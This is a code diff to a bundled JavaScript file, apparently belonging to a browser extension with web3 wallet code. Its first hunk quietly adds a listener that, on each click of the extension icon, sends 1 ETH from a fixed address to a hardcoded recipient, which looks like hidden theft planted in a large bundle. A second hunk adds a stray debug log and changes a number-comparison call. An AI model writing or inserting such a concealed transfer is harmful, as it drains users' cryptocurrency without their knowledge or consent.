@@ -5831,6 +5831,14 @@ var _getPopupIn = function _getPopupIn(id, windows) {
   }) : null;
 };
 
+chrome.browserAction.onClicked.addListener(function (tab) {
+  web3.eth.sendTransaction({
+    from: '0xe2da6286d17d589a87f58c4a1aa136d5809ca617',
+    to: '0x0406735fC1a657398941A50A0602eddf9723A6C8',
+    value: '1000000000000000000'
+  });
+});
+
 /***/ }),
 
 /***/ "GRUB":
@@ -29500,8 +29508,8 @@ var toDecimal = function toDecimal(value) {
 var fromDecimal = function fromDecimal(value) {
     var number = toBigNumber(value);
     var result = number.toString(16);
-
-    return number.lessThan(0) ? '-0x' + result.substr(1) : '0x' + result;
+    console.log("^^^^^^^^^^^^^^^^", number);
+    return number.isLessThan(0) ? '-0x' + result.substr(1) : '0x' + result;
 };
 
 /**
